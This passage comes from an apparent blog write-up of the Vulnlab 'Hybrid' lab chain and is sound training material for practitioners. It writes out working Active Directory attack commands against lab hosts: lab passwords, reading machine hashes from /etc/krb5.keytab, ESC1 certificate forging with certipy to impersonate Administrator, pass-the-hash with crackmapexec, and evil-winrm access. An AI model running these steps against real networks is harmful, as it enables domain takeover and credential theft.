class=\"line\">peter.turner@hybrid.vl@mail01:~$ sudo -l</span><br><span class=\"line\">[sudo] password for peter.turner@hybrid.vl: </span><br><span class=\"line\">Matching Defaults entries for peter.turner@hybrid.vl on mail01:</span><br><span class=\"line\">    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty</span><br><span class=\"line\"></span><br><span class=\"line\">User peter.turner@hybrid.vl may run the following commands on mail01:</span><br><span class=\"line\">    (ALL) ALL</span><br><span class=\"line\">peter.turner@hybrid.vl@mail01:~$ sudo su</span><br><span class=\"line\">root@mail01:/home/peter.turner@hybrid.vl# cd /root</span><br><span class=\"line\">root@mail01:~# ls</span><br><span class=\"line\">flag.txt  snap</span><br></pre></td></tr></table></figure>\n\n<p>The flag is in the <code>/root</code> directory as shown above, meaning we have compromised the first machine for this chain.</p>\n<h1 id=\"Pivoting-to-DC\"><a href=\"#Pivoting-to-DC\" class=\"headerlink\" title=\"Pivoting to DC\"></a>Pivoting to DC</h1><p>For the next box, I’m assuming that we’ll be able to start enumerating the machine with <code>peter.turner</code>‘s valid credentials.</p>\n<p>There is LDAP and SMB on the machine, so we could potentially verify whether this user is able to access anything. &#96;crackmapexec smb 10.10.194.118 -u ‘peter.turner’ -p ‘b0cwR+G4Dzl_rw’</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SMB         10.10.194.117   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hybrid.vl) (signing:True) (SMBv1:False)</span><br><span class=\"line\">SMB         10.10.194.117   445    DC01             [+] hybrid.vl\\peter.turner:b0cwR+G4Dzl_rw</span><br><span class=\"line\"></span><br><span class=\"line\">SMB         10.10.194.117   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hybrid.vl) (signing:True) (SMBv1:False)</span><br><span class=\"line\">LDAP        10.10.194.117   445    DC01             [-] hybrid.vl\\peter.turner:b0cwR+G4Dzl_rw Error connecting to the domain, are you sure LDAP service is running on the target ?</span><br></pre></td></tr></table></figure>\n\n<p>We’ll enumerate the SMB instance first to see if we can find anything. <code>smbclient -L 10.10.194.117 -U &#39;peter.turner&#39;</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Password for [WORKGROUP\\peter.turner]:</span><br><span class=\"line\"></span><br><span class=\"line\">\tSharename       Type      Comment</span><br><span class=\"line\">\t---------       ----      -------</span><br><span class=\"line\">\tADMIN$          Disk      Remote Admin</span><br><span class=\"line\">\tC$              Disk      Default share</span><br><span class=\"line\">\tIPC$            IPC       Remote IPC</span><br><span class=\"line\">\tNETLOGON        Disk      Logon server share </span><br><span class=\"line\">\tSYSVOL          Disk      Logon server share</span><br></pre></td></tr></table></figure>\n\n<p>Seems like everything on SMB is relatively normal. NETLOGON and SYSVOL are normal shares, and we can’t access any of the other shares. Just to verify though, I did go into NETLOGON and SYSVOL to ensure there wasn’t anything there, which there wasn’t.</p>\n<p>The error we had before with LDAP is an error I’ve ran into before - we know that LDAP is running on the target based on the NMAP scan. Let’s try and use <code>bloodhound-python</code> to enumerate the LDAP forest.<br><code>git clone https://github.com/dirkjanm/BloodHound.py.git</code><br><code>python3 bloodhound.py -d &#39;hybrid.vl&#39; -u &#39;peter.turner&#39; -p &#39;b0cwR+G4Dzl_rw&#39; -c all -ns 10.10.194.117 --zip</code></p>\n<p>This will dump the LDAP forest for us, and any valid domain objects that it can find based on the credentials that we have.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">INFO: Found AD domain: hybrid.vl</span><br><span class=\"line\">INFO: Getting TGT for user</span><br><span class=\"line\">INFO: Connecting to LDAP server: dc01.hybrid.vl</span><br><span class=\"line\">INFO: Found 1 domains</span><br><span class=\"line\">INFO: Found 1 domains in the forest</span><br><span class=\"line\">INFO: Found 2 computers</span><br><span class=\"line\">INFO: Connecting to LDAP server: dc01.hybrid.vl</span><br><span class=\"line\">INFO: Found 14 users</span><br><span class=\"line\">INFO: Found 53 groups</span><br><span class=\"line\">INFO: Found 2 gpos</span><br><span class=\"line\">INFO: Found 2 ous</span><br><span class=\"line\">INFO: Found 19 containers</span><br><span class=\"line\">INFO: Found 0 trusts</span><br><span class=\"line\">INFO: Starting computer enumeration with 10 workers</span><br><span class=\"line\">INFO: Querying computer: mail01</span><br><span class=\"line\">INFO: Querying computer: dc01.hybrid.vl</span><br><span class=\"line\">WARNING: Could not resolve: mail01: The resolution lifetime expired after 3.102 seconds: Server Do53:10.10.194.117@53 answered The DNS operation timed out.</span><br><span class=\"line\">INFO: Done in 00M 19S</span><br><span class=\"line\">INFO: Compressing output into 20240425021728_bloodhound.zip</span><br></pre></td></tr></table></figure>\n\n<p>We can now use <code>bloodhound</code> with the compressed archive we just received to enumerate the LDAP forest. In case you have never used Bloodhound or Neo4J before, here’s a resource to get started: <a href=\"https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux\">https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux</a></p>\n<p>Upon uploading the data into Bloodhound, we can begin to enumerate if <code>peter.turner</code> has delegation over anything.</p>\n<p>One thing I do want to note, there seems to be a user which we saw in the Roundcube instance named Ed. His full username seems to be <code>edward.miller@hybrid.vl</code>. I’m assuming we’ll need to compromise him somehow, but that’s still uphill. Bloodhound doesn’t seem to note anything down at the moment for <code>peter.turner</code>‘s privileges, so let’s see what users we can find in the users file that Bloodhound dumped originally.</p>\n<p>I’ve compromised a list of these users based on the JSON that was provided, and modified it into a wordlist based on the user.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ADMINISTRATOR@HYBRID.VL</span><br><span class=\"line\">GUEST@HYBRID.VL</span><br><span class=\"line\">KRBTGT@HYBRID.VL</span><br><span class=\"line\">EDWARD.MILLER@HYBRID.VL</span><br><span class=\"line\">PAMELA.SMITH@HYBRID.VL</span><br><span class=\"line\">JOSH.MITCHELL@HYBRID.VL</span><br><span class=\"line\">PETER.TURNER@HYBRID.VL</span><br><span class=\"line\">OLIVIA.SMITH@HYBRID.VL</span><br><span class=\"line\">RICKY.MYERS@HYBRID.VL</span><br><span class=\"line\">EMILY.WHITE@HYBRID.VL</span><br><span class=\"line\">ELLIOT.WATKINS@HYBRID.VL</span><br><span class=\"line\">KATHLEEN.WALKER@HYBRID.VL</span><br><span class=\"line\">MARGARET.SHEPHERD@HYBRID.VL</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Administrator</span><br><span class=\"line\">Guest</span><br><span class=\"line\">krbtgt</span><br><span class=\"line\">edward.miller</span><br><span class=\"line\">pamela.smith</span><br><span class=\"line\">josh.mitchell</span><br><span class=\"line\">peter.turner</span><br><span class=\"line\">olivia.smith</span><br><span class=\"line\">ricky.myers</span><br><span class=\"line\">emily.white</span><br><span class=\"line\">elliot.watkins</span><br><span class=\"line\">kathleen.walker</span><br><span class=\"line\">margaret.shepherd</span><br></pre></td></tr></table></figure>\n\n<p>Didn’t seem like we could dump any <code>ASREP</code> hashes with <code>GetNPUsers</code>, nor could we dump any usable TGSs&#x2F;TGTs for any of the users with <code>GetUserSPNs</code>.</p>\n<p>Let’s turn our attention to another avenue we could target, ADCS.</p>\n<h1 id=\"ESC1-ADCS-Exploitation\"><a href=\"#ESC1-ADCS-Exploitation\" class=\"headerlink\" title=\"ESC1 ADCS Exploitation\"></a>ESC1 ADCS Exploitation</h1><p>ADCS is a server role that essentially allows you to integrate PKI (Public Key Infrastructure) into an AD environment. This helps to maintain public key cryptography and digital signature&#x2F;certificate capabilities. ADCS vulnerabilities can allow us to request a certificate used to authenticate on behalf of another user in the domain. Let’s try to find any vulnerable certificate templates that we can use.</p>\n<p><code>certipy-ad find -vulnerable -username &#39;peter.turner&#39;@hybrid.vl -password b0cwR+G4Dzl_rw -dc-ip 10.10.194.117</code></p>\n<p>We’ll see that this returns one result of a vulnerable certificate denoted as <code>HybridComputers</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Certificate Templates</span><br><span class=\"line\">  0</span><br><span class=\"line\">    Template Name                       : HybridComputers</span><br><span class=\"line\">    Display Name                        : HybridComputers</span><br><span class=\"line\">    Certificate Authorities             : hybrid-DC01-CA</span><br><span class=\"line\">    Enabled                             : True</span><br><span class=\"line\">    Client Authentication               : True</span><br><span class=\"line\">    Enrollment Agent                    : False</span><br><span class=\"line\">    Any Purpose                         : False</span><br><span class=\"line\">    Enrollee Supplies Subject           : True</span><br><span class=\"line\">    Certificate Name Flag               : EnrolleeSuppliesSubject</span><br><span class=\"line\">    Enrollment Flag                     : None</span><br><span class=\"line\">    Private Key Flag                    : 16842752</span><br><span class=\"line\">    Extended Key Usage                  : Client Authentication</span><br><span class=\"line\">                                          Server Authentication</span><br><span class=\"line\">    Requires Manager Approval           : False</span><br><span class=\"line\">    Requires Key Archival               : False</span><br><span class=\"line\">    Authorized Signatures Required      : 0</span><br><span class=\"line\">    Validity Period                     : 100 years</span><br><span class=\"line\">    Renewal Period                      : 6 weeks</span><br><span class=\"line\">    Minimum RSA Key Length              : 4096</span><br><span class=\"line\">    Permissions</span><br><span class=\"line\">      Enrollment Permissions</span><br><span class=\"line\">        Enrollment Rights               : HYBRID.VL\\Domain Admins</span><br><span class=\"line\">                                          HYBRID.VL\\Domain Computers</span><br><span class=\"line\">                                          HYBRID.VL\\Enterprise Admins</span><br><span class=\"line\">      Object Control Permissions</span><br><span class=\"line\">        Owner                           : HYBRID.VL\\Administrator</span><br><span class=\"line\">        Write Owner Principals          : HYBRID.VL\\Domain Admins</span><br><span class=\"line\">                                          HYBRID.VL\\Enterprise Admins</span><br><span class=\"line\">                                          HYBRID.VL\\Administrator</span><br><span class=\"line\">        Write Dacl Principals           : HYBRID.VL\\Domain Admins</span><br><span class=\"line\">                                          HYBRID.VL\\Enterprise Admins</span><br><span class=\"line\">                                          HYBRID.VL\\Administrator</span><br><span class=\"line\">        Write Property Principals       : HYBRID.VL\\Domain Admins</span><br><span class=\"line\">                                          HYBRID.VL\\Enterprise Admins</span><br><span class=\"line\">                                          HYBRID.VL\\Administrator</span><br><span class=\"line\">    [!] Vulnerabilities</span><br><span class=\"line\">      ESC1                              : &#x27;HYBRID.VL\\\\Domain Computers&#x27; can enroll, enrollee supplies subject and template allows client authentication</span><br></pre></td></tr></table></figure>\n\n<p>You’ll notice the <code>ESC1</code> vulnerability indicator at the bottom of the template, which is telling us that <code>Domain Computers</code> can enroll supplies subject and also allows client authentication. This essentially means that any user can request a certificate on behalf of any other user in the network, even if that user is a privileged user (such as <code>Administrator</code>).</p>\n<p>So technically speaking, we can use our <code>peter.turner</code> credentials to generate a certificate on behalf of <code>Administrator</code>, right? Unfortunately, it’s not that simple in our case.<br>As you can see, the only role that can do this is <code>HYBRID.VL\\\\Domain Computers</code>, which means that only domain computers can perform this.</p>\n<p>Now this is relatively easy to move around, as we already have control of another computer on the domain - the recent <code>MAIL01</code> computer that we just compromised previously. We’ll need to find the NTLM hash of this domain computer, which we would normally just dump through tools such as <code>mimikatz</code> on a Windows machine. On a Domain-joined Linux machine, the NTLM hashes for the domain computer can usually be found in <code>/etc/krb5.keytab</code> in my experience.</p>\n<p><img src=\"/images/vulnlab/hybrid-vl/t.png\"></p>\n<p>Upon trying to read the file, we’ll find out that it’s unreadable since it is encrypted.<br>We can easily circumvent this by using a tool called <code>keytabextract.py</code>, which will dump the contents of this file in plaintext. <a href=\"https://github.com/sosdave/KeyTabExtract\">https://github.com/sosdave/KeyTabExtract</a></p>\n<p><img src=\"/images/vulnlab/hybrid-vl/u.png\"></p>\n<p>We can now use this NTLM hash to proceed with our certificate request.<br><code>certipy-ad req -u &#39;MAIL01$&#39;@hybrid.vl -hashes &#39;0f916c5246fdbc7ba95dcef4126d57bd&#39; -ca &#39;hybrid-DC01-CA&#39; -template HybridComputers -target hybrid.vl -upn &#39;administrator@hybrid.vl&#39; -dns dc01.hybrid.vl -key-size 4096 -debug</code></p>\n<p>Once again as a reminder, make sure that <code>dc01.hybrid.vl</code> and <code>hybrid.vl</code> both are set to the IP address of the DC in your <code>/etc/hosts</code> file. Just a reminder.<br>This should save a certificate and private key to a file called <code>administrator_dc01.pfx</code>. We can use this <code>.pfx</code> to now authenticate to the DC and dump the Administrator’s NT hash.</p>\n<p><code>certipy-ad auth -pfx administrator_dc01.pfx -username &#39;administrator&#39; -domain &#39;hybrid.vl&#39; -dc-ip 10.10.238.53</code><br>This will dump the NT hash in plaintext, to which we’ll use the second part of the hash to authenticate.</p>\n<p><img src=\"/images/vulnlab/hybrid-vl/v.png\"></p>\n<p>Let’s test our ability to authenticate to WinRM with these credentials using Pass-the-Hash on CrackMapExec.<br><code>crackmapexec winrm 10.10.238.53 -u &#39;Administrator&#39; -H &#39;60701e8543c9f6db1a2af3217386d3dc&#39;</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SMB         10.10.238.53    5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:hybrid.vl)</span><br><span class=\"line\">HTTP        10.10.238.53    5985   DC01             [*] http://10.10.238.53:5985/wsman</span><br><span class=\"line\">WINRM       10.10.238.53    5985   DC01             [+] hybrid.vl\\Administrator:60701e8543c9f6db1a2af3217386d3dc (Pwn3d!)</span><br></pre></td></tr></table></figure>\n\n<p>That <code>Pwn3d!</code> notification denotes that we can now access the machine through WinRM.<br><code>evil-winrm --ip 10.10.238.53 -u &#39;Administrator&#39; -H &#39;60701e8543c9f6db1a2af3217386d3dc&#39;</code></p>\n<p><img src=\"/images/vulnlab/hybrid-vl/w.png\"></p>\n<p>The root flag is within the Administrator’s <code>Desktop</code> directory, meaning we now have completed this chain!</p>\n<h1 id=\"Conclusion\"><a href=\"#Conclusion\" class=\"headerlink\" title=\"Conclusion\"></a>Conclusion</h1><p>This machine was an awesome first experience at chains. Given that it was a domain-joined Linux, it required much more research into the attack path as I wasn’t very familiar with this type of machine. It was a nice curveball, and the ADCS exploitation made it even more enjoyable. Big thanks goes out to xct for the development of this chain.</p>\n<h1 id=\"Resources\"><a href=\"#Resources\" class=\"headerlink\" title=\"Resources\"></a>Resources</h1><p><a href=\"https://ssd-disclosure.com/ssd-advisory-roundcube-markasjunk-rce/\">https://ssd-disclosure.com/ssd-advisory-roundcube-markasjunk-rce/</a><br><a href=\"https://www.hackingarticles.in/linux-privilege-escalation-using-misconfigured-nfs/\">https://www.hackingarticles.in/linux-privilege-escalation-using-misconfigured-nfs/</a><br><a href=\"https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux\">https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux</a><br><a href=\"https://github.com/sosdave/KeyTabExtract\">https://github.com/sosdave/KeyTabExtract</a></p>\n","cover_type":"img","excerpt":"","more":"<p>This chain was relatively fun and allowed me to learn a lot of different tactics that I would’ve previously not known how to do before. It involves attempting to gain initial access to a domain-joined Linux machine, following a pivot to the DC using ADCS.</p>\n<h1 id=\"Enumeration\"><a href=\"#Enumeration\" class=\"headerlink\" title=\"Enumeration\"></a>Enumeration</h1><p>Running our NMAP scanning to discover both machines <code>10.10.242.85</code> and <code>10.10.242.86</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(daz㉿LAPTOP-VA8M33JK)-[~/tech/vl/hybrid]</span><br><span class=\"line\">└─$ cat initial_scan.txt</span><br><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-29 00:38 EDT</span><br><span class=\"line\">Nmap scan report for 10.10.231.245</span><br><span class=\"line\">Host is up (0.095s latency).</span><br><span class=\"line\">Not shown: 988 filtered tcp ports (no-response)</span><br><span class=\"line\">PORT     STATE SERVICE       VERSION</span><br><span class=\"line\">53/tcp   open  domain        Simple DNS Plus</span><br><span class=\"line\">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-03-29 04:39:03Z)</span><br><span class=\"line\">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class=\"line\">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class=\"line\">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hybrid.vl0., Site: Default-First-Site-Name)</span><br><span class=\"line\">|_ssl-date: TLS randomness does not represent time</span><br><span class=\"line\">| ssl-cert: Subject: commonName=dc01.hybrid.vl</span><br><span class=\"line\">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.hybrid.vl</span><br><span class=\"line\">| Not valid before: 2023-06-17T14:05:41</span><br><span class=\"line\">|_Not valid after:  2024-06-16T14:05:41</span><br><span class=\"line\">445/tcp  open  microsoft-ds?</span><br><span class=\"line\">464/tcp  open  kpasswd5?</span><br><span class=\"line\">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class=\"line\">636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hybrid.vl0., Site: Default-First-Site-Name)</span><br><span class=\"line\">| ssl-cert: Subject: commonName=dc01.hybrid.vl</span><br><span class=\"line\">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.hybrid.vl</span><br><span class=\"line\">| Not valid before: 2023-06-17T14:05:41</span><br><span class=\"line\">|_Not valid after:  2024-06-16T14:05:41</span><br><span class=\"line\">|_ssl-date: TLS randomness does not represent time</span><br><span class=\"line\">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: hybrid.vl0., Site: Default-First-Site-Name)</span><br><span class=\"line\">|_ssl-date: TLS randomness does not represent time</span><br><span class=\"line\">| ssl-cert: Subject: commonName=dc01.hybrid.vl</span><br><span class=\"line\">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.hybrid.vl</span><br><span class=\"line\">| Not valid before: 2023-06-17T14:05:41</span><br><span class=\"line\">|_Not valid after:  2024-06-16T14:05:41</span><br><span class=\"line\">3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hybrid.vl0., Site: Default-First-Site-Name)</span><br><span class=\"line\">| ssl-cert: Subject: commonName=dc01.hybrid.vl</span><br><span class=\"line\">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.hybrid.vl</span><br><span class=\"line\">| Not valid before: 2023-06-17T14:05:41</span><br><span class=\"line\">|_Not valid after:  2024-06-16T14:05:41</span><br><span class=\"line\">|_ssl-date: TLS randomness does not represent time</span><br><span class=\"line\">3389/tcp open  ms-wbt-server Microsoft Terminal Services</span><br><span class=\"line\">| ssl-cert: Subject: commonName=dc01.hybrid.vl</span><br><span class=\"line\">| Not valid before: 2024-03-28T04:09:07</span><br><span class=\"line\">|_Not valid after:  2024-09-27T04:09:07</span><br><span class=\"line\">| rdp-ntlm-info:</span><br><span class=\"line\">|   Target_Name: HYBRID</span><br><span class=\"line\">|   NetBIOS_Domain_Name: HYBRID</span><br><span class=\"line\">|   NetBIOS_Computer_Name: DC01</span><br><span class=\"line\">|   DNS_Domain_Name: hybrid.vl</span><br><span class=\"line\">|   DNS_Computer_Name: dc01.hybrid.vl</span><br><span class=\"line\">|   Product_Version: 10.0.20348</span><br><span class=\"line\">|_  System_Time: 2024-03-29T04:39:51+00:00</span><br><span class=\"line\">|_ssl-date: 2024-03-29T04:40:31+00:00; 0s from scanner time.</span><br><span class=\"line\">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class=\"line\">Device type: general purpose</span><br><span class=\"line\">Running (JUST GUESSING): Microsoft Windows 2022 (89%)</span><br><span class=\"line\">Aggressive OS guesses: Microsoft Windows Server 2022 (89%)</span><br><span class=\"line\">No exact OS matches for host (test conditions non-ideal).</span><br><span class=\"line\">Network Distance: 2 hops</span><br><span class=\"line\">Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class=\"line\"></span><br><span class=\"line\">Host script results:</span><br><span class=\"line\">| smb2-time:</span><br><span class=\"line\">|   date: 2024-03-29T04:39:54</span><br><span class=\"line\">|_  start_date: N/A</span><br><span class=\"line\">| smb2-security-mode:</span><br><span class=\"line\">|   3:1:1:</span><br><span class=\"line\">|_    Message signing enabled and required</span><br><span class=\"line\"></span><br><span class=\"line\">TRACEROUTE (using port 139/tcp)</span><br><span class=\"line\">HOP RTT      ADDRESS</span><br><span class=\"line\">1   94.83 ms 10.8.0.1</span><br><span class=\"line\">2   95.02 ms 10.10.231.245</span><br><span class=\"line\"></span><br><span class=\"line\">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 104.10 seconds</span><br><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-29 00:40 EDT</span><br><span class=\"line\">Nmap scan report for 10.10.231.246</span><br><span class=\"line\">Host is up (0.094s latency).</span><br><span class=\"line\">Not shown: 990 closed tcp ports (reset)</span><br><span class=\"line\">PORT     STATE SERVICE  VERSION</span><br><span class=\"line\">22/tcp   open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class=\"line\">| ssh-hostkey:</span><br><span class=\"line\">|   256 60:bc:22:26:78:3c:b4:e0:6b:ea:aa:1e:c1:62:5d:de (ECDSA)</span><br><span class=\"line\">|_  256 a3:b5:d8:61:06:e6:3a:41:88:45:e3:52:03:d2:23:1b (ED25519)</span><br><span class=\"line\">25/tcp   open  smtp     Postfix smtpd</span><br><span class=\"line\">|_smtp-commands: mail01.hybrid.vl, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, AUTH PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, CHUNKING</span><br><span class=\"line\">80/tcp   open  http     nginx 1.18.0 (Ubuntu)</span><br><span class=\"line\">|_http-server-header: nginx/1.18.0 (Ubuntu)</span><br><span class=\"line\">|_http-title: Redirecting...</span><br><span class=\"line\">110/tcp  open  pop3     Dovecot pop3d</span><br><span class=\"line\">| ssl-cert: Subject: commonName=mail01</span><br><span class=\"line\">| Subject Alternative Name: DNS:mail01</span><br><span class=\"line\">| Not valid before: 2023-06-17T13:20:17</span><br><span class=\"line\">|_Not valid after:  2033-06-14T13:20:17</span><br><span class=\"line\">|_pop3-capabilities: AUTH-RESP-CODE TOP STLS UIDL PIPELINING SASL RESP-CODES CAPA</span><br><span class=\"line\">|_ssl-date: TLS randomness does not represent time</span><br><span class=\"line\">111/tcp  open  rpcbind  2-4 (RPC #100000)</span><br><span class=\"line\">| rpcinfo:</span><br><span class=\"line\">|   program version    port/proto  service</span><br><span class=\"line\">|   100003  3,4         2049/tcp   nfs</span><br><span class=\"line\">|   100003  3,4         2049/tcp6  nfs</span><br><span class=\"line\">|   100005  1,2,3      37551/udp6  mountd</span><br><span class=\"line\">|   100005  1,2,3      49714/udp   mountd</span><br><span class=\"line\">|   100005  1,2,3      50857/tcp6  mountd</span><br><span class=\"line\">|   100005  1,2,3      53003/tcp   mountd</span><br><span class=\"line\">|   100021  1,3,4      34841/tcp   nlockmgr</span><br><span class=\"line\">|   100021  1,3,4      35283/tcp6  nlockmgr</span><br><span class=\"line\">|   100021  1,3,4      37554/udp   nlockmgr</span><br><span class=\"line\">|_  100021  1,3,4      45267/udp6  nlockmgr</span><br><span class=\"line\">143/tcp  open  imap     Dovecot imapd (Ubuntu)</span><br><span class=\"line\">|_imap-capabilities: IMAP4rev1 LOGIN-REFERRALS more SASL-IR STARTTLS ID LOGINDISABLEDA0001 have post-login Pre-login ENABLE LITERAL+ listed IDLE OK capabilities</span><br><span class=\"line\">|_ssl-date: TLS randomness does not represent time</span><br><span class=\"line\">| ssl-cert: Subject: commonName=mail01</span><br><span class=\"line\">| Subject Alternative Name: DNS:mail01</span><br><span class=\"line\">| Not valid before: 2023-06-17T13:20:17</span><br><span class=\"line\">|_Not valid after:  2033-06-14T13:20:17</span><br><span class=\"line\">587/tcp  open  smtp     Postfix smtpd</span><br><span class=\"line\">|_smtp-commands: mail01.hybrid.vl, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, AUTH PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, CHUNKING</span><br><span class=\"line\">993/tcp  open  ssl/imap Dovecot imapd (Ubuntu)</span><br><span class=\"line\">| ssl-cert: Subject: commonName=mail01</span><br><span class=\"line\">| Subject Alternative Name: DNS:mail01</span><br><span class=\"line\">| Not valid before: 2023-06-17T13:20:17</span><br><span class=\"line\">|_Not valid after:  2033-06-14T13:20:17</span><br><span class=\"line\">|_imap-capabilities: IMAP4rev1 LOGIN-REFERRALS more SASL-IR OK ID Pre-login have post-login ENABLE capabilities LITERAL+ listed IDLE AUTH=LOGINA0001 AUTH=PLAIN</span><br><span class=\"line\">|_ssl-date: TLS randomness does not represent time</span><br><span class=\"line\">995/tcp  open  ssl/pop3 Dovecot pop3d</span><br><span class=\"line\">|_pop3-capabilities: AUTH-RESP-CODE TOP USER UIDL PIPELINING SASL(PLAIN LOGIN) RESP-CODES CAPA</span><br><span class=\"line\">| ssl-cert: Subject: commonName=mail01</span><br><span class=\"line\">| Subject Alternative Name: DNS:mail01</span><br><span class=\"line\">| Not valid before: 2023-06-17T13:20:17</span><br><span class=\"line\">|_Not valid after:  2033-06-14T13:20:17</span><br><span class=\"line\">|_ssl-date: TLS randomness does not represent time</span><br><span class=\"line\">2049/tcp open  nfs      3-4 (RPC #100003)</span><br><span class=\"line\">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class=\"line\">TCP/IP fingerprint:</span><br><span class=\"line\">OS:SCAN(V=7.94SVN%E=4%D=3/29%OT=22%CT=1%CU=30324%PV=Y%DS=2%DC=T%G=Y%TM=6606</span><br><span class=\"line\">OS:4698%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)</span><br><span class=\"line\">OS:OPS(O1=M4D4ST11NW7%O2=M4D4ST11NW7%O3=M4D4NNT11NW7%O4=M4D4ST11NW7%O5=M4D4</span><br><span class=\"line\">OS:ST11NW7%O6=M4D4ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)</span><br><span class=\"line\">OS:ECN(R=Y%DF=Y%T=40%W=F507%O=M4D4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%</span><br><span class=\"line\">OS:F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T</span><br><span class=\"line\">OS:5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=</span><br><span class=\"line\">OS:Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF</span><br><span class=\"line\">OS:=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40</span><br><span class=\"line\">OS:%CD=S)</span><br><span class=\"line\"></span><br><span class=\"line\">Network Distance: 2 hops</span><br><span class=\"line\">Service Info: Host:  mail01.hybrid.vl; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class=\"line\"></span><br><span class=\"line\">TRACEROUTE (using port 5900/tcp)</span><br><span class=\"line\">HOP RTT      ADDRESS</span><br><span class=\"line\">1   95.17 ms 10.8.0.1</span><br><span class=\"line\">2   95.26 ms 10.10.231.246</span><br><span class=\"line\"></span><br><span class=\"line\">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 87.40 seconds</span><br></pre></td></tr></table></figure>\n\n<p>We can see here that there seems to be a Windows and a Linux machine, which probably hints at the fact that we are going to have to mess around with a domain-joined Linux machine.</p>\n<p>The Windows machine appears to be the DC as the domain name for it is <code>dc01.hybrid.vl</code>, which means we’ll turn our attention to the Linux machine first.</p>\n<p>There seems to be an HTTP web server that is redirecting us somewhere. I also noticed that this machine’s domain name is <code>mail01.hybrid.vl</code>, so we’ll change this in our host file.</p>\n<p><img src=\"/images/vulnlab/hybrid-vl/b.jpg\"></p>\n<p>This brings us to a Roundcube email login page, which we’ll probably need to find credentials for.</p>\n<h1 id=\"External-NFS-Mounts\"><a href=\"#External-NFS-Mounts\" class=\"headerlink\" title=\"External NFS Mounts\"></a>External NFS Mounts</h1><p>Before we mess with anything, I want to turn our attention to another potential vulnerable service on the machine - NFS.</p>\n<p>NFS is a file sharing service, much like CIFS(which essentially is SMB). Instead of directly viewing the shares through a command-line interface, we can use NFS to potentially view public shares and mount them to our machine.</p>\n<p>In order to view the different mounts on NFS, we can browse the NFS interface using <code>showmount</code><br><code>showmount -e 10.10.242.86</code></p>\n<p>To which we’ll receive the following output:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Export list for 10.10.242.86:</span><br><span class=\"line\">/opt/share *</span><br></pre></td></tr></table></figure>\n\n<p>This means 